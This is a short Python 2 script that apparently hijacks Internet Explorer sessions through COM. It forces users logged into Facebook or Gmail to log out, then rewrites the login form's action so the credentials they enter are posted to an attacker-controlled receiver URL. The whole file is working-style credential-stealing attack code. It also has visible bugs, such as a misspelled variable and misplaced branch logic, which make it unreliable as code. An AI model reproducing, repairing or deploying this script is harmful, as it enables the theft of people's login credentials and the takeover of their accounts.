import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080"
target_sites = {}
target_sites["facebook.com"] = {
	"logout_url" : "logout_form",
	"logout_form_index": 0,
	"owned": False
}

target_sites["accounts.gmail.com"] = {
	"logout_url": "logout_form",
	"logout_form_index": None,
	"owned": False
}

target_sites["www.gmail.com"] = target_sites["accounts.gmail.com"]
target_sites["mail.google.com"] = target_sites["accounts.gmail.com"]
clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
windows = win32com.client.Dispatch(clsid)

def waitForBrowser(browser):
	while browser.ReadyState != 4 and browser.ReadyState != 'complete':
		time.sleep(0.5)
	return

while True:
	for browser in windows:
		url = urlparse.urlparse(browser.LocationUrl)

		if url.hostname in target_sites:
			if target_sites[url.hostname]["owned"]:
				continue
			#Redirect if url
			if target_sites[url.hostname]["logout_url"]:
				browser.Navigate(target_sites[url.hostname]["logout_url"])
				waitForBrowser(browser)
		else:
			#Retrieve all elements in the document
			full_doc = browser.Document.all
			for i in full_doc:
				try:
					#find logout form and submit
					if i.id == target_sites[url.hostname]["logout_form"]:
						i.submit()
						waitForBrowser(browser)
				except:
					pass

				#Modify the login form

				try:
					login_index = target_sites[url.hostname]["logout_form_index"]
					login_page = urllib.quote(browser.LocationUrl)
					browser.Document.forms[login_index].action = "%s%s" %(data_.receiver,login_page)
					target_sites[url.hostname]["owned"] = True
				except Exception as e:
					pass
		time.sleep(5)